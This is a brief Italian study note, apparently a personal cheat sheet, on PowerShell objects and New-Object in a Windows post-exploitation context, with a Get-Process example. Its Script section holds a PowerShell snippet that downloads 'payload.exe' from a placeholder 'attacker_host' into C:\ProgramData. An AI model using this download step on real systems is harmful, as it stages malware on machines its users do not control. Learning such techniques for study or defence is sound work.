
## Tags
1. Tecniche
	1.  #postexploitation  #powersehell
2. Ambiente
	1. #windows
3. Contesto

## Comandi usati

1. New-Object

## Teoria

1. Objects
	1. Rappresentano i dati di una funzione chiamata
		1. Per esempio se cerchi le informazioni di sistema, non ti fa un output pulito ma ti da proprio i dati
		2. ![[Pasted image 20260222095727.png]]
		3. Si possono manipolare gli oggetti, per esempio se sappiamo che per stoppare un processo possiamo usare il comando kill, allora la formula è molto semplice
			1. Get-Process -Name "NomeProcesso" | kill

## Script

```
$webclient = New-Object System.Net.WebClient
$payload_url = "https://attacker_host/payload.exe"
$file = "C:\ProgramData\payload.exe"
$webclient.DownloadFile ($payload_url , $file)
```